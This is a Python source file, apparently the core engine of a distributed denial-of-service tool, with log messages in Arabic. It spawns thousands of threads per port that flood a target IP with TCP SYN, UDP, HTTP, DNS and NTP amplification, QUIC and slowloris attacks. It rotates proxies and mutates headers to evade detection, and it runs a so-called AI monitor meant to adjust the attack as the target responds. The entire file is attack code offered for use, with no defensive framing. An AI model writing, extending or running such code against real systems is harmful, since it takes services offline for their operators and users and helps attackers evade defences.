# core/attack_engine.py
import threading
import random
import time
from protocols import tcp_syn, udp_flood, http_flood, dns_amp, ntp_amp, quic_flood, slowloris
from stealth import header_mutator, proxy_rotator
from core import ai_analyzer

class AttackEngine:
    def __init__(self, target_ip, ports, protocols, threads_per_port=1000, duration=60):
        self.target_ip = target_ip
        self.ports = ports if isinstance(ports, list) else [ports]
        self.protocols = protocols
        self.threads_per_port = threads_per_port
        self.duration = duration
        self.threads = []
        self.running = True

    def start(self):
        print(f"[INFO] بدء الهجوم على {self.target_ip} المنافذ: {self.ports} البروتوكولات: {self.protocols}")

        for port in self.ports:
            for protocol in self.protocols:
                for _ in range(self.threads_per_port):
                    t = threading.Thread(target=self.attack_runner, args=(protocol, port))
                    t.daemon = True
                    t.start()
                    self.threads.append(t)

        ai_thread = threading.Thread(target=self.ai_monitor)
        ai_thread.daemon = True
        ai_thread.start()

        time.sleep(self.duration)
        self.running = False

        for t in self.threads:
            t.join(timeout=1)

        print("[INFO] انتهى الهجوم.")

    def attack_runner(self, protocol, port):
        while self.running:
            headers = header_mutator.random_headers() if protocol in ["HTTP", "QUIC", "SLOWLORIS"] else {}
            ip_source = proxy_rotator.get_random_proxy()
            packet_size = random.randint(512, 4096)

            if protocol == "TCP":
                tcp_syn.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "UDP":
                udp_flood.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "HTTP":
                http_flood.attack(self.target_ip, port, headers, ip_source)
            elif protocol == "DNS_AMP":
                dns_amp.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "NTP_AMP":
                ntp_amp.attack(self.target_ip, port, packet_size, ip_source)
            elif protocol == "QUIC":
                quic_flood.attack(self.target_ip, port, headers, ip_source)
            elif protocol == "SLOWLORIS":
                slowloris.attack(self.target_ip, port, headers, ip_source)

            time.sleep(0.001)

    def ai_monitor(self):
        while self.running:
            change_needed = ai_analyzer.analyze(self.target_ip)
            if change_needed:
                print("[AI] تعديل استراتيجية الهجوم بناءً على ردود الهدف.")
                # يمكن إضافة منطق تغيير البروتوكولات أو تقليل Threads
            time.sleep(5)
